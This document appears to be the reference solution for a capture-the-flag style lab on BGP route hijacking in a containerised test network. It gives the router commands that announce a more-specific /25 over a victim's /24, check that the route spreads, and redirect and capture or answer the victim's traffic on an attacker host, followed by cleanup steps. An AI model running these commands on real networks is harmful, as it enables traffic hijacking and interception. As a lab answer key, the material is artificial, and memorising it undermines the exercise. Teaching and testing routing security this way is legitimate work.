# Reference solution: false-origin via more-specific

The win turns on longest-prefix match. The victim announces a /24. Announce a /25
covering the half of the address space the target service sits in, and every
router prefers your /25 for those addresses, because a more-specific route beats
a less-specific one regardless of AS_PATH length or policy. With both transits
filtering nothing, your /25 propagates unchallenged.

## Steps

1. Get onto your foothold. Locally:

       ./ctl player        # lands you on the ops host
       foothold            # into attacker-as, straight to its vtysh

   The vtysh login is privileged already (the prompt ends in `#`), so there is no
   enable password to deal with.

2. Announce the more-specific:

       configure terminal
       ip route 203.0.113.0/25 Null0
       router bgp 65020
        address-family ipv4 unicast
         network 203.0.113.0/25
       end

   203.0.113.0/25 is not connected on your router, so the discard
   (`ip route ... Null0`) goes in first: it puts the prefix in the RIB so the
   `network` statement has something to advertise. Leave the running config as is,
   no `write memory`, so `./ctl down && ./ctl up` brings back a clean baseline.

   Confirm locally before you leave vtysh:

       show ip bgp 203.0.113.0/25      # your path, origin 65020

3. Check it went global. Back on the ops host:

       exit
       lg

   You want 203.0.113.0/25 in the table with a path ending in 65020, next to the
   legitimate 203.0.113.0/24. The looking glass peers a single transit, so this is
   one provider's vantage rather than an omniscient view, and it runs one query
   and drops you, it is read only.

4. Data-plane bonus: take the traffic, do not just sink it. Step 2 black-holes the
   hijacked range at Null0, which diverts and denies but shows you nothing. Point
   it at your ops host instead, which you do control:

       foothold
       configure terminal
       no ip route 203.0.113.0/25 Null0
       ip route 203.0.113.0/25 100.64.0.10
       end

   Then, on the ops host, watch the victim's traffic land on you:

       tcpdump -ni eth1 dst net 203.0.113.0/25

   To terminate rather than observe, give the ops host the service address and
   answer for it (`ip addr add 203.0.113.10/32 dev eth1`, then a listener).
   Propagation in step 3 already scores the flag; this is the interception
   variant.

## Cleanup / reset

From the foothold:

       configure terminal
       router bgp 65020
        address-family ipv4 unicast
         no network 203.0.113.0/25
       end
       no ip route 203.0.113.0/25 Null0

Or just `./ctl down && ./ctl up` for a clean table.

## Operator cross-checks

These use god-mode and belong to the operator, not the player:

       ./ctl table                                                   # gamemaster, both tables
       docker exec -it clab-inter-domain-eyeball traceroute -n 203.0.113.10